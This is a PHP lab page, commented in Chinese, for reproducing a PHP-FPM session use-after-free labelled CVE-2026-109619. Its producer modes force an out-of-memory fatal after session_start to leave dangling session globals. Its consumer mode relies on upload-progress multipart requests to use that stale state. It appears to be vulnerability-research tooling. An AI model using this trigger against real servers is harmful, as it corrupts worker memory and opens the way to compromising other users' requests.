<?php
// gh.php — CVE-2026-109619 FPM 路径验证靶场页（仅用于本机授权实验）。
//
// 角色：
//   ?producer=1  生产者请求：正常 startup 后进入执行阶段，session_start()
//                并写 $_SESSION（把请求拥有的状态发布到 worker 全局），
//                然后通过 str_repeat 分配触发 memory_limit OOM fatal，
//                打断 session 关闭时的匹配 reset —— PS(http_session_vars)
//                与已释放的请求堆之间的引用被残留下来。
//                （执行阶段 OOM 不杀 FPM child —— probe2_56.py/A2 已实证）
//   ?consumer=1  消费者请求：multipart 带 PHP_SESSION_UPLOAD_PROGRESS，
//                在正常 RINIT 之前经 rfc1867 回调触碰残留 session 全局态。
//
// 页面本身不做任何防护性清理 —— 这正是公告描述的生产者/消费者模型
// （"publishes state during application execution after successful startup,
//   reaches a fatal error, and then uses session upload progress as the
//   early consumer"）。

if (isset($_GET['producer'])) {
    $mode = $_GET['producer'];

    if ($mode === '2') {
        // --- 生产者变体 B：fatal 落在 RSHUTDOWN 内部（ps_write 序列化时 OOM）---
        // 思路：$_SESSION 持有 6MB 活字符串（占住 memory_limit 预算），脚本
        // 正常结束；RSHUTDOWN -> php_session_flush -> ps_write 序列化时需要
        // 再分配 ~6MB -> 12MB > 8M -> OOM bailout 发生在模块 RSHUTDOWN 途中。
        // 若 5.6 的 session RSHUTDOWN 没把 flush 包进 zend_try，bailout 会跳过
        // 其后的 php_rshutdown_session_globals -> PS(id)/PS(http_session_vars)
        // 残留到下一请求 —— 8.4 悬空 PS(id) 的直接对应物。
        session_start();
        $_SESSION['pad'] = str_repeat('A', 6 * 1024 * 1024);
        echo "published, dying at write\n";
        exit;
    }

    // --- 生产者变体 A：执行阶段发布 session 状态，随后 fatal 打断 reset ---
    session_start();                       // 发布 PS(http_session_vars)
    $_SESSION['leak'] = str_repeat('A', 1024);
    unset($_SESSION['leak']);              // 状态已发布；fatal 后无人重置

    // 触发执行阶段 OOM fatal：memory_limit=8M，str_repeat 申请 64MB
    // fatal 打断 php_request_shutdown 前的 session reset 语义。
    $x = str_repeat('B', 64 * 1024 * 1024);
    echo "unreachable: " . strlen($x) . "\n";
    exit;
}

if (isset($_GET['consumer']) || isset($_GET['probe'])) {
    // --- 消费者：upload_progress 在 RINIT 前触碰 session 全局态 ---
    // 什么都不做 —— multipart 里的 PHP_SESSION_UPLOAD_PROGRESS 字段
    // 会在 rfc1867 解析阶段自动调用 php_session_initialize()，抢在
    // 正常请求初始化之前消费掉生产者残留的悬空全局态。
    echo "consumer stage\n";
    exit;
}

echo "OK gh.php\n";
